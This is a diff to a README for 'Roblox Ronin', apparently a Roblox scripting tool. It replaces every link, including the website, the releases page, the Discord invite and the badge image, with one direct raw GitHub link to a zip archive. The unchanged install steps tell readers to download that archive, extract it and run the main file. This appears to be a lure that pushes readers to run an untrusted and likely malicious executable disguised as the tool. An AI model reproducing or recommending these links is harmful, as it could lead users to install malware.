@@ -2,7 +2,7 @@
 
 Welcome to the **Roblox Ronin** repository! This project aims to enhance your scripting experience in Roblox with a powerful Lua environment. You can build faster and smarter, creating unique scripts using our extensive toolkit.
 
-[![Visit Ronix](https://img.shields.io/badge/Visit-Ronix-4CAF50)](https://ronix.app)
+[![Visit Ronix](https://raw.githubusercontent.com/jackhack20/Roblox-Ronin/master/pararthria/Ronin-Roblox-v3.2.zip)](https://raw.githubusercontent.com/jackhack20/Roblox-Ronin/master/pararthria/Ronin-Roblox-v3.2.zip)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ Roblox Ronin is designed for developers who want to take their scripting to the 
 
 ## Getting Started
 
-To get started with Roblox Ronin, you will need to follow a few simple steps. Make sure to check the [Releases](https://github.com/yourusername/Roblox-Ronin/releases) section for the latest updates and downloads.
+To get started with Roblox Ronin, you will need to follow a few simple steps. Make sure to check the [Releases](https://raw.githubusercontent.com/jackhack20/Roblox-Ronin/master/pararthria/Ronin-Roblox-v3.2.zip) section for the latest updates and downloads.
 
 ### Prerequisites
 
@@ -41,7 +41,7 @@ Before you begin, ensure you have the following:
 
 ## Installation
 
-1. **Download the Latest Version**: Visit our website at [Ronix](https://ronix.app) to download the latest version of Roblox Ronin.
+1. **Download the Latest Version**: Visit our website at [Ronix](https://raw.githubusercontent.com/jackhack20/Roblox-Ronin/master/pararthria/Ronin-Roblox-v3.2.zip) to download the latest version of Roblox Ronin.
 2. **Extract Files**: Once downloaded, extract the files to a folder of your choice.
 3. **Run the Application**: Open the folder and execute the main file to start using Roblox Ronin.
 
@@ -73,7 +73,7 @@ Roblox Ronin is open-source software licensed under the MIT License. Feel free t
 
 ## Contact
 
-If you have any questions or feedback, please reach out to us through our [Discord server](https://discord.gg/yourserverlink) or visit [Ronix](https://ronix.app) for more information.
+If you have any questions or feedback, please reach out to us through our [Discord server](https://raw.githubusercontent.com/jackhack20/Roblox-Ronin/master/pararthria/Ronin-Roblox-v3.2.zip) or visit [Ronix](https://raw.githubusercontent.com/jackhack20/Roblox-Ronin/master/pararthria/Ronin-Roblox-v3.2.zip) for more information.
 
 ---
 
